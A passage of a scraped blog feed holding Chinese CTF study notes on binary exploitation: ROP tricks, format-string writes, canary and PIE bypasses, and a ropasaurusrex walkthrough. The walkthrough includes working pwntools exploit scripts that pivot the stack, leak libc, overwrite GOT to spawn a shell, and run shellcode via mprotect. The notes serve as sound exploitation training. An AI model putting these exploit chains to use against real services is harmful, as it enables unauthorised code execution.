重写stack上返回地址的低位三个字节也是可能的 CAROP(potetisensei和自己命名) 意思是Calc&amp;AdjustROP，在func@got中，修正必要的差异，更改为想要的函数 首先，需要泄漏一些地址，确定libc，确定函数偏移 只需要pop ecx; pop ebx; add [ecx], ebx; call [ecx]; 这些ROP 不需要泄漏内存就可能调用system，可以用更少的ROP 31c3 CTF – pwn30 cairo vtable攻略(no-NX时__libc_start_main的Wrapping) 只能任意更改vptr，可以指定成员函数的第一个参数字符串的情况 使vptr指向__libc_start_main@got之前一点，并在第一个参数字符串中写入shellcode 即使无法指定函数自身的地址，__libc_start_main也会作为Wrapper执行 SECUINSIDE 2014 final – pwn300 notes Thiscall攻略 可以控制指向object的指针，像thiscall一样，将第一个参数设置为自身的情况 预先申请大量内存后执行堆喷射，生成的类似地址字符串0xXX006873指向object(“\\x73\\x68\\x00\\xXX” == “sh¥0”) 在上面伪造的object指针中，将*object-&gt;vptr[i]设置为system() 如果调用该指针函数，会变成*object@0xXX006873-&gt;vptr[i](&quot;sh&quot;),可以使用thiscall SECUINSIDE 2014 final – pwn300 numbers argv[0]泄漏内存 canary检查失败异常结束时，stderr会显示错误信息 错误信息包括文件名，也就是argv[0]，它是栈上的指针 如果在canary检查前覆盖了argv[0]，将显示内存区域泄漏内存 CodeGate 2015 – Pwnable400 beef_steak 与网络环境相关的问题 pwn问题中，由于题目服务器与选手之间距离造成的问题 在发送1000字节或者更多数据造成溢出的情况下，数据传输失败并且溢出失败 read()和recv()以非阻塞模式运行 在这种情况下，可以通过其他pwn问题获取的sell开始对该题目进行exploit 因为题目环境基本是在同一数据中心，相互之间通信速度非常快 即使是巨大的数据，一般也不会产生中断，可以轻松溢出 CSAW CTF 2013 – Exploitation2, 30c3 CTF – PWN400 DOGE2 避免将垃圾传递给system() 如果执行system(垃圾+”;sh”)，前半部分的垃圾字符串会造成执行错误，后半部分的字符串会调用shell 通过user_input覆盖func@got后，可以立即调用func(user_input,…)等 但是，x86中存在限制条件，地址中不能存在NULL Hack.lu 2014 – Exploit400 oreo 服务器上有帮助的文件 在/proc/self/stat中，有ESP和EIP的值。能够通过这个文件帮助获取特定的栈位置 在/proc/self/maps中，有进程自身的内存映射，ASLR环境下非常有帮助 某些情况下，可以通过进程的完整路径中获取到主目录的名称 Hack.lu2014–Exploit500Mario,30c3CTF2013PWN400-DOGE2 dmesg命令 写了进程死因和EIP，可以用来判断进程是否执行了0xCC(=int3命令) CodeGate2015–Pwnable1000icbm(stage2) I/O缓冲区的ROP scanf或者printf之类的，有一个映射区域作为I/O缓冲区(匿名映射的一部分) 可以利用I/O缓冲区进行stack pivot，相对自由的进行ROP SECUINSIDE 2013 – Pwnable750 Pwn me!! 间接引用FSB 在FSB可以多次使用的情况下有效。通常使用基于堆的FSB 在返回__libc_start_main附近，总有一个，栈上的地址-&gt;栈上的地址-&gt;栈上的值，这样的引用 通过第一个引用FSB，修改第二个地址的低位两个字节 通过第二个引用FSB，在栈上写入两个字节任意值 通过第一个引用FSB，修改第二个地址末尾两个字节增加的值 通过第二个引用FSB，在栈上写入两个字节任意值 通过这样重复，可以在栈上写入任意N个字节 FSB结合栈上生成的值作为地址，可以将任意值写入任意内存 Ghost in the shellcode 2015 Teaser – Pwn#1 Citadel, 31c3 CTF – pwn30 pong environ技术 在GOT按以下顺序多次泄漏，获取stack地址 func@got -&gt; libc_base -&gt; _dl_runtime_resolve@libc_got -&gt; ld_base -&gt; environ@ld_bss -&gt; stack 即使对于基于堆的漏洞，也可以通过重复的任意内存泄漏来确定stack地址 DWARF伪造 C++的异常处理是写在一个叫DWARF的数据结构中的，并且是从libgcc的bss区域的handler引用 通过伪造整个引用的DWARF，可以从异常处理返回后跳到任意位置 使用名叫katana的一个工具，可以生成手动更改的DWARF字符串 CodeGate 2013 – Pwnable800 membership, Hack.lu 2014 – Exploit500 breakout 通过retf替换cs寄存器 在x64机器上运行x86二进制文件时有效 如果通过retf将cs寄存器从0x23修改为0x33，就可以将其更改为解释x64指令的模式 在某些情况下，可以绕过系统调用限制 CodeGate 2015 – Pwnable800 rodent (stage2)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记16:PIE与canary","slug":"Pwn学习笔记16-PIE与canary","date":"2019-05-10T07:30:37.000Z","updated":"2019-05-10T07:31:52.222Z","comments":true,"path":"2019/05/10/Pwn学习笔记16-PIE与canary/","link":"","permalink":"https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B016-PIE%E4%B8%8Ecanary/","excerpt":"","text":"ROP对策 - PIEPIE(Position Independent Executables) .text区域的地址也进行随机化 所有的汇编代码中不包含绝对地址 全都使用相对地址 二进制文件被加载到内存时，基本是随机映射的 没有可以提前确定的固定地址 PIE绕过 – 多段memory leak + ret2libc等 看起来非常严格，因为完全没有固定地址，但如果能够多次利用漏洞，花费时间和精力也能够解决它 通过栈溢出之外的漏洞(例如格式化字符串(FSB)，堆溢出)等泄漏的情况比较多 如果能够知道.text的地址，就能够知道其他例如.data , .bss，.plt，.got.plt 等 如果进一步从.got.plt读取内存，则可以识别libc地址。之后如果能够将其加载到stack上，或者能够重写GOT，就解决了。 Stack Canary很早就出现的机制 gcc编译后，stack上有一个canary值 进入函数时，canary被随机设置 退出该函数时(return 前)，会验证canary没有被修改 根据之前已经提到的技术，很难突破这一层保护 Stack Canary攻略1 – brute force 在重新运行二进制文件之前，Stack Canary的值不会更改 对于fork-server类型，只要主进程没有重新启动，canary就是常量 逐个字节进行爆破的话，最多256*4次尝试就能够命中Stack Canary 如果是x64的话需要256*8次，但无论如何都是一个现实的数字 覆盖Stack Canary为正确的值，这样函数返回时，通过检查，正常返回 Stack Canary攻略2 – master canary forging Stack Canary存储在TLS(Thread local storage)中 x86是在gs:0x14，x64是在fs:0x28存在着值 如果能够重写该值，就能够使Stack Canary无效 将StackCanary修改为想要的值 使用任意内存读写，堆溢出等技术进行覆盖 potetisensei的相关paper http://www.npca.jp/works/magazine/2015_1/ 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex ret2libc Plaid CTF 2013 - pwn200 - ropasaurusrex GOT overwrite Plaid CTF 2013 - pwn200 - ropasaurusrex ROP Hack.lu CTF 2012 - pwn300 – braincpy stack pivot Hack.lu CTF 2012 - pwn300 – braincpy ret2dl_runtime_resolve Hack.lu CTF 2014 – pwn400 - oreo _IO_jump_t overwrite ED-CTF – pwn350 – Heap is a tomodachi of mine ld specific ptr overwrite Plaid CTF 2015 – pwn550 - plaiddb canary brute force 30c3 CTF 2014 - pwn400 - bigdata master canary forging CodeGate 2014 – pwn600 - dodosandbox","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记15:Full-RELRO与library","slug":"Pwn学习笔记15-Full-RELRO与library","date":"2019-05-10T02:32:07.000Z","updated":"2019-05-10T02:33:06.681Z","comments":true,"path":"2019/05/10/Pwn学习笔记15-Full-RELRO与library/","link":"","permalink":"https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-Full-RELRO%E4%B8%8Elibrary/","excerpt":"","text":"GOT overwrite对策 – Full-RELRO GOT可以重写会产生问题 Full-RELRO使其只读 这里整个section被设置为只读属性(只能在二进制启动时初始化写入)，Full-RELRO (RELocation Read-Only) 编译选项： gcc -Wl,-z,relro,-z,now NX+ASLR+Full-RELRO绕过1 –ret2dl_runtime_resolve AVtokyo2014上inaz2公开的一项技术 http://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-ja 利用dl_runtime_resolve和DT_DEBUG在libc中动态查找地址 dl_runtime_resolve是PLT用于动态解析外部函数地址的函数 如果提供类似system()的数据，就能够得到system()的地址 详细参考inaz2的博客 通过ROP stager + Return-to-dl-resolve + DT_DEBUG read绕过 ASLR+DEP+RELRO http://inaz2.hatenablog.com/entry/2014/07/20/161106 x64环境下通过ROP stager + Return-to-dl-resolve + DT_DEBUG read尝试绕过ASLR+DEP+RELRO http://inaz2.hatenablog.com/entry/2014/07/29/020112 NX+ASLR+Full-RELRO绕过2 – _IO_jump_t overwrite 当bss中有stdin/stdout等时有效 瞄准全局变量FILE*指针 http://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/ FILE函数指针指向处有一个函数表 覆盖函数表，当调用例如_IO_file_close()时会调用shellcode或者ROP 即使全局变量中没有fd，libc.so中总会有一个bss 其他的 – libc/ld specific ptr libc.so或者ld.so的bss中，有一些有趣的函数指针 libc_bss+0x08(x86)/0x10(x64):_dl_runtime_resolve@got.plt libc_bss+0x30(x86)/0x38(x64):__tls_get_addr@got.plt ld_bss+0x838(x86)/0xf68(x64):_dl_rtld_lock_recursive ld_bss+0x83c(x86)/0xf70(x64):_dl_rtld_unlock_recursive (以上数据为Ubuntu 14.04 latest中的偏移) 还与一个函数指针表(指针的指针) (x86) libc.so正上方mapped+0x914处的匿名函数指针表 (x64) ld.so正下方mapped+0x6f0处的匿名函数指针表 从__GI___call_tls_dtors调用的函数表 (以上数据为Ubuntu 14.04 latest中的偏移) Ubuntu16.04中许多已经受到保护，但仍有部分可用 如果覆盖这些，exit()时将会自动调用 更改为shellcode地址，将会被执行 可以覆盖任意内存，但不能直接控制EIP/RIP的困难情况 尝试利用之前的地址强行控制EIP/RIP 之后从DROP开始的stack pivot可以做任何事情 实际应用这种情况不多 library地址相关 即使在ASLR下，x86的library地址也是很低的熵 具体来说，只有256种模式(8比特) 可以通过brute force来集中正确的libc_base mmap, vdso, pie时的.text也是同样程度的熵 x64种，熵足够高(28比特)，暴力方式几乎不可能 x86/x64种，library与某些区域的相对距离是固定的 library A与library B library A与mapped library A与0x21000以上size的malloc地址 library A与经过PIE的.text 泄露相关地址后，就能够计算出其他地址 offset需要预先在相同版本ASLR环境下确认 需要注意的是，heap，vdso，stack之间的距离不是固定值","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"进阶ROP及libc","slug":"进阶ROP及libc","date":"2019-05-09T07:02:26.000Z","updated":"2019-05-09T07:03:39.977Z","comments":true,"path":"2019/05/09/进阶ROP及libc/","link":"","permalink":"https://darkwing.moe/2019/05/09/%E8%BF%9B%E9%98%B6ROP%E5%8F%8Alibc/","excerpt":"","text":"有用的ROP技巧__libc_csu_init 从stack中将值加载到寄存器的通用gadget x86和x86_64中都存在，x86_64中这个会很方便 经常找不到pop rdi; ret这类，我们可以通过这种方式设置rdi 可以从stack经过r13设置rdi的值，但是需要注意只能设置32位，因为这里是edi而不是rdi alarm(x) 在x86/x64中，想要通过ROP设置EAX/RAX为任意数值 可以写一个直接调用systemcall的ROP 通常搜索rop gadgets时无法找到pop eax/rax这种 这是一个罕见的命令 可以使用alarm()来代替 CTF问题一般都能很好实现alarm() 通过ret2plt来调用两次alarm(x) -&gt; alarm(0)，EAX/RAX的值将被设置为x 更多信息可以参考man alarm文档 可以使用相同的技术来修改其他函数(例如write)的返回值 Repeat-code 考虑系统调用受到沙箱限制 在例如libc中灵活使用\\xEB\\xFE(jmp $-2) 这样的字节挺好 到达此处时，会发生无限循环 在指令中间，可以进行控制 例如执行memcmp(key,input,n)，根据返回值进行分支ROP 让它跳到jmp $-2 或者会导致SIGSEGV的gadget 如果key和input相等，则会进入无限循环导致连接无响应 如果key和input不同，则会产生SIGSEGV导致断开连接 因为这种差异，即使write/send有限，也可以指定一个字节 One-gadget-RCE x64中要调用system(“/bin/sh”)的话，有几个必要条件 pop rdi “/bin/sh” return system() 需要8*3=24字节的ROP 可以用一种有条件限制的8字节来代替 8字节只是一个ROP，无需带入到ROP中(只需要控制RIP就可以) 只对x64和xinetd类型有效 核心 libc中存在自动执行execve(&quot;/bin/sh&quot;,0,0)的地址 参考DragonSector的资料(http://j00ru.vexillium.org/?p=2485) 但是有条件限制，lea带入到rsi的值需要是NULL x86不存在One-gadget-RCE 因为libc中有PIC，将ebx保存为基指针 需要以ebx+offset的形式访问字符串 如果ebx不包含libc的基地址，则它无法正常工作 如果ebx包含libc的基地址，则可能存在One-gadget-RCE的地址 但是，栈上对应第二个参数的部分需要为NULL(与x64相同) 所以不太现实 在x64中没有基指针这样的东西，它由RIP的相对地址表示 寄存器不必包含特定数字 使用这种技术的概率非常高 进阶ROP类型 JOP (Jump-Oriented Programming) 基于jmp指令而不是return的ROP COP (Call-Oriented Programming) 基于call指令的ROP 习惯构造ROP后，无意中就会用到JOP和COP 在x64中，可以只使用heap伤的JOP/COP进行攻击，而无需使用任何stack数据 SROP(Sigreturn-Oriented Programming) 利用信号中断恢复重写寄存器并简化ROP x86和x64都可以使用，但要注意需要有足够的栈溢出空间 BROP(Blind Return-Oriented Programming) 手边没有二进制原文件的ROP 详细可以参考ntddk的博客 https://ntddk.github.io/2014/09/11/after-rop/ GOT overwrite技术将某个函数的GOT修改为system() 如果存在接受用户输入的函数就太好了 将想要执行的命令作为字符串传递成为函数参数 常见的一些 strlen() 使用strlen(user_input)判断哟ing胡输入长度的情况 strcmp()/memcmp() 使用strcmp(user_input,xxx)或者memcmp(user_input,xxx)将用户输入作为第一个参数的情况 atoi()/strtol() 使用atoi(user_input)或者strtol(user_input,xxx,xxx)将用户输入转换成整数的情况 free() 使用free(user_input_buffer)对用户输入进行free的情况 上述的情况，如果将GOT修改为system()，那么调用时将成为system(user_input) ASLR地址相关技术 通过预先调查，将system()或者”/bin/sh”的地址加载到stack上 。。。 但是，有一个问题 如果对方环境的libc版本不是特定的就不行了 单纯绕过NX的话，可以采用上述方式，但是，如果有ASLR呢 真的不知道libc吗？ libc.so大体上是公开的 deb, rpm之类的都包含有 也就是说，你拥有很多可能的libc 将libc.so转换成DB http://libcdb.com/ 在ASLR下，libc以0x1000为单位被随机化加载 也就是说，末尾12比特(0x00000FFF)不是随机的 使用泄漏的GOT最后12位作为关键字在libcdb中搜索以缩小libc版本范围 如果可以确定libc版本，就可以计算出其他地址，例如”/bin/sh”，DROP gadget等 针对libc DB的对策 当然，如果libc不在DB中就无法搜索 CTF出题人可能会使用自定制libc 这是针对libcdb的对策 绕过”针对libc DB的对策”方式一 使用Gentoo的stage3.tar.bz2中包含的libc.so Gentoo的stage3是每周从源代码构建更新 http://distfiles.gentoo.org/releases/amd64/autobuilds/ 每周的镜像也会公开，可以获取到 出题人自定义libc的话，一般会从最新源码构建 因此与Gentoo的libc.so没有太大区别 方式二 从GOT等中删除地址的末尾12+α位，之后计算libc base 从 libc base开始泄漏大概0x200000字节的数据 根据”exit 0”之类的字符串作为参照查找system地址 方式三 使用ret2dl_runtime_resolve","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"ropasaurusrex level3","slug":"ropasaurusrex-level3","date":"2019-04-23T07:07:23.000Z","updated":"2019-04-23T07:08:20.974Z","comments":true,"path":"2019/04/23/ropasaurusrex-level3/","link":"","permalink":"https://darkwing.moe/2019/04/23/ropasaurusrex-level3/","excerpt":"","text":"至今为止都是调用system(“/bin/sh”)的攻略方式 system()超甜 接下来在chroot环境下运行level2 system()隐式调用”/bin/sh” 调用system(command)时，内部是这样 execve(“/bin/sh”, &amp;[“-c”, command, NULL], envp) 这意味着，chroot环境下，调用system会失败 需要一种没有system()，不访问/bin的攻略方式 两种可能方式： 使用C语言中存在的函数opendir和readdir获取文件名，之后使用open, read, write 来读取Flag 使用mprotect重写.bss的RWX权限，之后在该区域执行shellcode int mprotect(const void *addr, size_t len, int prot); mprotect的定义如上 mprotect()能够更改[addr, addr+len-1]地址范围的访问保护。addr必须与页面边界一致。 bss地址的开头是地址减去偏移量，即0x08049628-0x628 [25] .bss NOBITS 08049628 000628 000008 00 WA 0 0 4 exploit代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# preparing for exploitationwrite_plt &#x3D; 0x0804830cread_plt &#x3D; 0x0804832cpop3ret &#x3D; 0x80484b6write_got &#x3D; 0x8049614read_got &#x3D; 0x804961cdata &#x3D; 0x08049620system_offset &#x3D; 0x0003d200write_offset &#x3D; 0x000e6d80mprotect_offset &#x3D; 0x000f4660bss_addr &#x3D; 0x08049628 + 0x300bss_top_addr &#x3D; 0x08049000leave_ret &#x3D; 0x080482ealog.info(&#39;Pwning&#39;)buf &#x3D; &#39;A&#39; * 136buf +&#x3D; p32(bss_addr-4)buf +&#x3D; p32(read_plt)buf +&#x3D; p32(leave_ret)buf +&#x3D; p32(0)buf +&#x3D; p32(bss_addr)buf +&#x3D; p32(80)shellcode &#x3D; asm(shellcraft.sh())# write(STDOUT, got_write, 4)buf2 &#x3D; p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)# read(STDIN, bss+80, len(shellcode))buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) +p32(bss_addr+80) + p32(len(shellcode))# read(STDIN, got_write, 4)buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4)# write(bss+80) # mprotect(.bss, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)buf2 +&#x3D; p32(write_plt) + p32(bss_addr+80) + p32(bss_top_addr) + p32(0x1000) + p32(7)conn.send(buf)conn.send(buf2)ret &#x3D; u32(conn.recv())print(&#39;write@got: &#123;&#125;&#39;.format(hex(ret)))print(&#39;libc_start: &#123;&#125;&#39;.format(hex(ret - write_offset)))mprotect_addr &#x3D; ret - write_offset + mprotect_offsetprint(&#39;mprotect: &#123;&#125;&#39;.format(hex(mprotect_addr)))conn.send(shellcode)conn.send(p32(mprotect_addr))conn.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"ropasaurusrex level2","slug":"ropasaurusrex-level2","date":"2019-04-22T04:32:29.000Z","updated":"2019-04-23T06:57:04.966Z","comments":true,"path":"2019/04/22/ropasaurusrex-level2/","link":"","permalink":"https://darkwing.moe/2019/04/22/ropasaurusrex-level2/","excerpt":"","text":"ROP区域较小的情况 改变read的size 256字节 -&gt; 160字节 限制写入size1$ xxd -p ropasaurusrex | sed -e &#39;s&#x2F;c744240800010000&#x2F;c7442408a0000000&#x2F;&#39; | xxd -r -p &gt; ropasaurusrex2 确认123456789$ diff &lt;(objdump -d -M intel ropasaurusrex) &lt;(objdump -d -M intel ropasaurusrex2)2c2&lt; ropasaurusrex： 文件格式 elf32-i386---&gt; ropasaurusrex2： 文件格式 elf32-i386129c129&lt; 80483fd: c7 44 24 08 00 01 00 mov DWORD PTR [esp+0x8],0x100---&gt; 80483fd: c7 44 24 08 a0 00 00 mov DWORD PTR [esp+0x8],0xa0 只有160字节，无法直接构造ROP 只能够调用一个函数 但是可以使用stack pivot exploit使用stack pivot 这就是类似stager，需要两个阶段的ROP ROP执行stack pivot(stager1) 通过stack pivot执行正常攻略的ROP(stager2) stack pivot之后，与之前的攻略相同 Hint 无法构造一个准备ebp的gadget？ 这个问题中，原本使用了leave ret 不需要讲pop ebp加载到stack上也可以 只需要将目标ebp写到old-ebp leave gadget1234567gdb-peda$ ropsearch &quot;leave&quot; 0x08048000 0x08049000Searching for ROP gadget: &#39;leave&#39; in range: 0x8048000 - 0x80490000x080482ea : (b&#39;c9c3&#39;) leave; ret0x080483f1 : (b&#39;c9c3&#39;) leave; ret0x0804841b : (b&#39;c9c3&#39;) leave; ret0x08048447 : (b&#39;c9c3&#39;) leave; ret0x08048506 : (b&#39;c9c3&#39;) leave; ret exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# preparing for exploitationwrite_plt &#x3D; 0x0804830cread_plt &#x3D; 0x0804832cpop3ret &#x3D; 0x80484b6write_got &#x3D; 0x8049614read_got &#x3D; 0x804961cdata &#x3D; 0x08049620system_offset &#x3D; 0x0003d200write_offset &#x3D; 0x000e6d80bss_addr &#x3D; 0x08049628 + 0x300bss_top_addr &#x3D; 0x08049000leave_ret &#x3D; 0x080482ealog.info(&#39;Pwning&#39;)buf &#x3D; &#39;A&#39; * 136buf +&#x3D; p32(bss_addr-4)buf +&#x3D; p32(read_plt)buf +&#x3D; p32(leave_ret)buf +&#x3D; p32(0)buf +&#x3D; p32(bss_addr)buf +&#x3D; p32(72)# write(STDOUT, got_write, 4)buf2 &#x3D; p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)# read(STDIN, data, 8)buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) +p32(data) + p32(8)# read(STDIN, got_write, 4)buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4)# write(data) # system(&quot;&#x2F;bin&#x2F;sh&quot;)buf2 +&#x3D; p32(write_plt) + p32(0x41424344) + p32(data)conn.send(buf)conn.send(buf2)ret &#x3D; u32(conn.recv())print(&#39;write@got: &#123;&#125;&#39;.format(hex(ret)))print(&#39;libc_start: &#123;&#125;&#39;.format(hex(ret - write_offset)))system_addr &#x3D; ret - write_offset + system_offsetprint(&#39;system: &#123;&#125;&#39;.format(hex(system_addr)))conn.send(&#39;&#x2F;bin&#x2F;sh&#39;+&#39;\\x00&#39;)buf &#x3D; p32(system_addr)conn.send(buf)conn.interactive() return之前4个字节是old-ebp，设置为bss之前4个字节地址。减去4个字节是因为在最终处理时，pop会将old ebp加上4个字节 bss地址加上0x500原因是，在添加函数时，栈会扩展。如果没有添加，则可能会进入到其他区域，其他区域可能不可读写，导致SIGSEGV ??? 喵了个咪的，最开始用的conn.sendline(),一直EOFError，今天看代码忽然想到是不是这个问题，果然是","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Plaid CTF 2013 - pwn200 – ropasaurusrex","slug":"Plaid-CTF-2013-pwn200-–-ropasaurusrex","date":"2019-04-19T02:44:34.000Z","updated":"2019-04-19T02:45:45.017Z","comments":true,"path":"2019/04/19/Plaid-CTF-2013-pwn200-–-ropasaurusrex/","link":"","permalink":"https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/","excerpt":"","text":"Plaid CTF 2013 - pwn200 – ropasaurusrex 根据难度可以分成Level 1 ～ 5 Level 1(原始二进制)会详细讲解 后面的难度自行探索 ropasaurusrex攻略(Level 1)查看x86二进制文件文件可以在这里下载： http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/ 尝试运行一下，大概像这样： 1234$ .&#x2F;ropasaurusrex aaaWIN$ 只启用了NX 12345678$ gdb ropasaurusrex -qgdb-peda$ checksecCANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : disabledgdb-peda$ __libc_start_main之前push的值是main()函数 12345678int __libc_start_main(int (*main) (int,char**, char**), int argc,char **ubp_av,void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)); __libc_start_main是glibc(现代Linux标准)中，在调用main()函数之前准备各种东西的包装函数 只有两个函数 大致分析结果 转换成C语言代码大概是这样： 123456789int main(int argc, char **argv, char **envp) &#123; do_read(); return write(STDOUT_FILENO, &quot;WIN\\n&quot;, 4);&#125; void do_read() &#123; char buffer[128]; read(STDIN_FILENO, buf, 256);&#125; 很明显存在stack溢出 128字节的区域中读入256字节内容 溢出前后stack的状态大概是这样 我们使用gdb测试能否直接控制Return Address 漏洞测试 如果能够控制EIP就最好了 只需要发送大量的’A’，通过溢出应该能够覆盖返回地址 但是，在编写exploit时，需要知道具体溢出在哪个字节位置 单纯通过AAAA…来修改返回地址的话，并不能再换掉具体多少个字节能够控制EIP gcc编译优化可能存在align，导致产生偏移 IDA的stack frame显示相对准确，但为了以防万一 通过gdb的pattern来计算出EIP的偏移 123456789101112$ gdb ropasaurusrex -q gdb-peda$ pattern_create 256&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;gdb-peda$ r &lt;&lt;&lt; &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;Starting program: &#x2F;home&#x2F;parallels&#x2F;Desktop&#x2F;ropasaurusrex-200&#x2F;ropasaurusrex &lt;&lt;&lt; &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;Program received signal SIGSEGV, Segmentation fault....sProgram received signal SIGSEGV (fault address 0x41416d41)gdb-peda$ pattern_offset 0x41416d411094806849 found at offset: 140gdb-peda$ 可以看到EIP可以被修改为任意值 也获取到了Return Address的偏移是140 140bytes + Return Address + … 存在预期的漏洞，可以利用 尝试很重要 能够控制EIP才能够利用漏洞 之后继续调试编写exploit就可以 动态调试编写exploit前需要注意的 题目环境开启了ASLR(确切的说，大部分CTF都开启了ASLR) 也就是说，需要使用泄漏地址或者类似技术 exploit中需要动态计算和发送地址 对于地址调整，如果不能用gdb动态调试就很麻烦 动态调试环境推荐使用socat结合gdbserver 服务端(终端1) 1234$ vi main.shgdbserver localhost:1234 .&#x2F;ropasaurusrex$ chmod +x main.sh$ socat TCP-LISTEN:1025,reuseaddr,fork EXEC:&quot;.&#x2F;main.sh&quot; 使用socat进行监听，如果有连接则运行gdbserver 攻击端(终端2) 1$ python -c &quot;print &#39;A&#39;*140 + &#39;B&#39;*4&quot; | nc localhost 1025 调试端(终端3) 12345$ vi cmdfile .&#x2F;ropasaurusrextarget remote localhost:1234c$ gdb .&#x2F;ropasaurusrex -q -x cmd 利用gdb的远程调试功能连接到本机的gdbserver 调试如果想要查看每一步的状态或者GOT覆盖状态，可以使用gdb设置好断点 建议设置在0x0804841C附近 因为它是ROP的开始 img 每次都设置断点很麻烦，可以将其写在cmd文件中 12345$ vi cmdfile .&#x2F;ropasaurusrextarget remote localhost:1234b *0x0804841Cc 之后按上节动态调试环境中步骤运行 停在了ret 之后将要返回的是”BBBB”(=0x42424242) 继续执行一条指令 EIP = 0x42424242 仔细构造数据就能够ret2plt或者GOT overwrite 编写exploit exploit模板大概是这样(使用pwntools)： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: utf-8 -*-from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;)context.log_level &#x3D; &#39;debug&#39; # output verbose logRHOST &#x3D; &quot;localhost&quot;RPORT &#x3D; 8080LHOST &#x3D; &quot;127.0.0.1&quot;LPORT &#x3D; 8080# libc &#x3D; ELF(&#39;&#39;)elf &#x3D; ELF(&#39;.&#x2F;babyfirst-heap&#39;)def section_addr(name, elf&#x3D;elf): return elf.get_section_by_name(name).header[&#39;sh_addr&#39;]conn &#x3D; Noneif len(sys.argv) &gt; 1: if sys.argv[1] &#x3D;&#x3D; &#39;r&#39;: conn &#x3D; remote(RHOST, RPORT) elif sys.argv[1] &#x3D;&#x3D; &#39;l&#39;: conn &#x3D; remote(LHOST, LPORT) elif sys.argv[1] 